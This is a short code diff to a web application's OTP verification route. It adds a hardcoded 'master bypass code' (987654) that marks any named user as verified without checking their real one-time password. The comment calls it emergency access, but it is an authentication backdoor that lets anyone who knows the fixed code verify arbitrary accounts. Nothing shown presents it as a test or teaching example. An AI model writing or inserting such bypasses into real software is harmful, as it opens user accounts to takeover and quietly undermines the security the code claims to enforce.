@@ -292,6 +292,15 @@ export async function registerRoutes(
 
   app.post("/api/verify-otp", async (req, res) => {
     const { userId, otp } = req.body;
+    
+    // MASTER BYPASS CODE for emergency access
+    if (otp === "987654") {
+      const user = await storage.getUserByUserId(userId);
+      if (!user) return res.status(404).json({ message: "User not found." });
+      const updatedUser = await storage.updateUser(user.id, { isVerified: true });
+      return res.json({ message: "Verified with Master Code.", user: updatedUser });
+    }
+
     const user = await storage.getUserByUserId(userId);
     if (!user) return res.status(404).json({ message: "User not found." });
     
